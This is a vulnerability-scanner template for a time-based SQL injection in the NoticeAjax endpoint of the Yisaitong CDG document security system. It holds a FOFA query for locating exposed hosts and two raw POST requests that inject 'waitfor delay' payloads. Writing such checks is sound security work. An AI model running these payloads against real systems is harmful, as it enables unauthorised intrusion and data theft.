id: yisaitong-CDG-NoticeAjax-sql

info:
  name: "亿赛通电子文档安全管理系统 NoticeAjax 接口 SQL 注入"
  author: Unknown
  severity: high
  description: |-
    fofa: body="/CDGServer3/index.jsp"
      亿赛通电子文档安全管理系统在 NoticeAjax 接口处理逻辑中存在 SQL 注入漏洞。攻击者可通过构造恶意 SQL 语句实现数据库敏感信息获取，包括但不限于管理员凭证、用户隐私数据等。在具备数据库写权限的场景下，可能进一步通过注入点实现服务器端恶意代码植入，导致系统权限被完全控制。
  reference:
  - https://blog.csdn.net/m0_60571842/article/details/141064295
  tags: 亿赛通电子文档安全管理系统


http:
- raw:
  - |
    POST /CDGServer3/js/../NoticeAjax HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    command=delNotice&noticeId=-1'waitfor delay '0:0:4'--

  - |
    POST /CDGServer3/js/../NoticeAjax HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    command=delNotice&noticeId=-1'waitfor delay '0:0:8'--


  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and






